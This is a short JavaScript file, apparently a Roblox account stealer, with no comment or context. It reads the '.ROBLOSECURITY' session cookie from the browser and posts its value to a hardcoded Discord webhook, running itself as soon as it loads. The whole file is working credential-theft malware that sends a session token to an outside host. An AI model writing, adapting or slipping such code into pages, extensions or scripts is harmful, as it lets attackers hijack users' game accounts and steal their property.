// Get the cookie value
function getCookieValue(cookieName) {
    const cookieString = document.cookie;
    const cookies = cookieString.split('; ');
    for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].split('=');
        if (cookie[0] === cookieName) {
            return cookie[1];
        }
    }
    return null;
}

// Send the cookie value to Discord webhook
function sendToDiscord(webhookUrl, cookieValue) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', webhookUrl);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(JSON.stringify({ content: `Cookie value: ${cookieValue}` }));
}

// Main function
function main() {
    const cookieValue = getCookieValue('.ROBLOSECURITY');
    if (cookieValue) {
        sendToDiscord('https://discord.com/api/webhooks/1262824616762806383/6ryiigDuC4nyBfEHnp-zY58Srrwlp_iWI5UNQKOReJDyawcIxiBTZhbWv2uVuSrBQpHe', cookieValue);
    }
}

// Run the main function
main();